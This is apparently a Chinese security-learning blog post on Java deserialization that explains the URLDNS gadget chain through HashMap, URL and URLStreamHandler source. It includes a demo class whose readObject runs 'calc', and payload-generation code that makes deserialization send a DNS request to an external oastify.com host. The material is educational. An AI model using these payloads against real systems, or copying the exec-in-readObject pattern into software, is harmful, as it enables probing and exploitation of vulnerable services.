---
title: Java反序列化-01-URLDNS链
date: 2025-7-02 20:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---

# 序列化和反序列化

通过 ObjectOutputStream 将需要序列化数据写入到流中，因为 Java IO 是一种装饰者模式，因此可以通过 ObjectOutStream 包装 FileOutStream 将数据写入到文件中或者包装 ByteArrayOutStream 将数据写入到内存中。同理，可以通过 ObjectInputStream 将数据从磁盘 FileInputStream 或者内存 ByteArrayInputStream 读取出来然后转化为指定的对象即可。

## 基础代码

### 序列化类

```java
import java.io.Serializable;

 public class Person  implements Serializable {
     public String name;
     public int age;

     public Person(){

     }
     public Person(String name,int age){
         this.name = name;
         this.age = age;
     }
     public String toString() {
         return "Person{" +
                 "name='" + name + '\'' +
                 ", age=" + age +
                 '}';
     }
     //重写readObject类，反序列化时就会调用重写的readObject类，就会引发漏洞
	private void readObject(ObjectInputStream ois) throws 		Exception,ClassNotFoundException {
         ois.defaultReadObject();
         Runtime.getRuntime().exec("calc");
     }
}
```



### 序列化函数

```java
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;

public class SerializationTest {
    //序列化
    public static void serialize(Object obj)throws IOException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void main(String[] args) throws Exception {
    Person person =new Person("zhangsan",18);
    System.out.println(person);
    serialize(person);
    }

}
```



### 反序列化函数

```java
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class UnserializeTest {
    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois =new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
    public static void main(String [] args) throws Exception{
    Person person = (Person)unserialize("ser.bin");
    System.out.println(person);
}
}
```

## 原理

反序列化时会调用`readObject`方法，`readObject`方法书写不当就会引发漏洞

## 注意点

(1) 序列化类的属性没有实现 **Serializable**那么在序列化就会报错,需要实现序列化接口

(2) 在反序列化过程中，它的父类如果没有实现序列化接口，那么将需要提供无参构造函数来重新创建对象。

(3)一个实现 **Serializable**接口的子类也是可以被序列化的。

(4) 静态成员变量是不能被序列化

序列化是针对对象属性的，而静态成员变量是属于类的。

(5) transient 标识的对象成员变量不参与序列化

# URLDNS链

## 简介

`URLDNS` 是ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞。该利用链具有如下特点：

- 不限制jdk版本，使用Java内置类，对第三方依赖没有要求
- 目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞
- URLDNS利用链，只能发起DNS请求，并不能进行其他利用

## 原理

HashMap这个类重写了readObject函数，该函数就是反序列化时调用的函数，<font color=red>初次学习可以通过IDEA一步一步去点源码分析</font>

注意源码中最后的putVal函数，其中调用了hash函数去计算key值，然后我们跳到hash函数

`HashMap`类`readObject`函数源码：

```java
private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
        // Read in the threshold (ignored), loadfactor, and any hidden stuff
        s.defaultReadObject();
        reinitialize();
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new InvalidObjectException("Illegal load factor: " +
                                             loadFactor);
        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0)
            throw new InvalidObjectException("Illegal mappings count: " +
                                             mappings);
        else if (mappings > 0) { // (if zero, use defaults)
            // Size the table using given load factor only if within
            // range of 0.25...4.0
            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (fc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

其中参数`key`就是我们要传的`URL`，如果`key`值不等于空就要执行`key.hashCode()`，<font color=red>接着跳去看`hashCode`函数，注意这里的`hashcCode`函数是`java.net.URL`包中URL类的`hashCode`函数</font>,因为我们传的Key值就是URL，在IDEA中不能直接通过Ctrl+鼠标左键直接跳转了，简单点的方法就是直接在代码中实例化一个URL类，然后点进去就可以了.

`HashMap`类`hash`函数源码:

```java
 static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
```

`hashCode`等于-1时执行 `hashCode = handler.hashCode(this);`，去跟进`handler`

`URL`类`hashCode()`函数源码:

```java
public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
```

`transient`关键字修饰JAVA序列化对象时，不需要进行序列化。`handler`是一个`URLStreamHandler`的实例化对象，然后跟进`URLStreamHandler`类的`hashCode`函数,因为调用的是`handler.hashCode(this);`

`URL`类`handler`方法源码：

```java
 transient URLStreamHandler handler;
```

其中就会执行`getHostAddress`，然后就会发起DNS查询请求

`URLStreamHandler`类的`hashCode()`函数源码：

```java
protected int hashCode(URL u) {
        int h = 0;

        // Generate the protocol part.
        String protocol = u.getProtocol();
        if (protocol != null)
            h += protocol.hashCode();

        // Generate the host part.
        InetAddress addr = getHostAddress(u);
        if (addr != null) {
            h += addr.hashCode();
        } else {
            String host = u.getHost();
            if (host != null)
                h += host.toLowerCase().hashCode();
        }

        // Generate the file part.
        String file = u.getFile();
        if (file != null)
            h += file.hashCode();

        // Generate the port part.
        if (u.getPort() == -1)
            h += getDefaultPort();
        else
            h += u.getPort();

        // Generate the ref part.
        String ref = u.getRef();
        if (ref != null)
            h += ref.hashCode();

        return h;
    }
```

## 代码

其中还涉及到java反射的内容，可以自行学习一下

其中利用反射机制拿到URL类的hashCode变量，这是个私有属性，所以需要对`setAccessible`设置true值，来修改私有属性

上面分析时提到`hashCode`变量要不等于-1时，才执行`handler.hashCode(this);`，所以给`url`的`hashCode`变量赋值，使其不等于-1

然后将配置好的url放入HashMap，然后将url的hashCode改为-1，确保反序列化时成功，然后序列化之后将内容进行反序列化就可以触发DNS查询

```java
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class SerializationTest {
    //序列化
    public static void serialize(Object obj)throws IOException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }


     public static void main(String[] args) throws Exception {
       HashMap map = new HashMap();
        URL url = new URL("http://a7ik628p6r4ba42na9heq464uv0mofc4.oastify.com");
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true); // 绕过Java语言权限控制检查的权限，可以修改私有属性
        f.set(url,123); // 设置hashcode的值为-1的其他任何数字
        System.out.println(url.hashCode());
        map.put(url,123); // 调用HashMap对象中的put方法，此时因为hashcode不为-1，不再触发dns查询
        f.set(url,-1); // 将hashcode重新设置为-1，确保在反序列化成功触发
         serialize(map);
     }

}

```

然后反序列化时就会触发DNS查询

```java
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class Unserialize {


    public static void  Unserialize() throws Exception {
        ObjectInputStream inputstream = new ObjectInputStream(new FileInputStream("ser.bin"));
        inputstream.readObject();
        inputstream.close();
    }

    public static void main(String[] args) throws Exception {
        Unserialize();
    }
}

```



